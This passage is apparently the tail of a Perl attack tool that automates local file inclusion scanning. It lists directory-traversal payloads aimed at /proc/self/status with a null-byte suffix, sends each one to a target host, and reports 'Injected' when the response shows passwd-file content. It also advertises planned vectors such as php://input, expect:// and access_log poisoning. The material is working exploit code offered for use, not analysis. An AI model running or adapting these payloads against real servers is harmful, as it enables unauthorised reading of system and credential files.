'../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../../../../proc/self/status%00');


foreach $scan(@auto){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$vuln = "Injected";
$not = "Not Injected";
$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /root:x:/) { 
print "$scan.........................";
print colored"[$vuln]\n",'green';
}
else{
print "$scan.........................";
print colored"[$not]\n",'red';
}
}
Finish:;
     print ("\n\n");
     print ("\t\t\t Finish Scanning... \n\n");
print color("green" ), "[";print color("white"),"01";print color("green"),"]";print color("blue"),"Back\n";
print color("green" ), "[";print color("white"),"02";print color("green"),"]";print color("red"),"Exit\n";
$item = <>;
chomp($item);

if ($item  eq '1'){
        goto main;
        }
if ($item eq '2'){
        exit;
}else{
                print"\n\n";
                print "\t\t Press '1' to Back and Press '2' to Exit\n";
                goto menu;
}

Comming_soon:;
print ("\n\n");
print ("\t\t\tCOMMING SOON..\n\n");
print colored("php://input             \n",'red');
print colored("/proc/self/fd           \n",'yellow');
print colored("access_log              \n",'blue');
print colored("phpinfo                 \n",'green');
print colored("data://		    	   \n",'red'); 
print colored("expect://		  	   \n\n",'yellow');
print color("green" ), "[";print color("white"),"01";print color("green"),"]";print color("blue"),"Back\n";
print color("green" ), "[";print color("white"),"02";print color("green"),"]";print color("red"),"Exit\n";
$item = <>;
chomp($item);
	
if ($item  eq '1'){
        goto main;
        }
if ($item eq '2'){
        exit;
}else{
                print"\n\n";
                print "\t\t Press '1' to Back and Press '2' to Exit\n";
                goto menu;
};
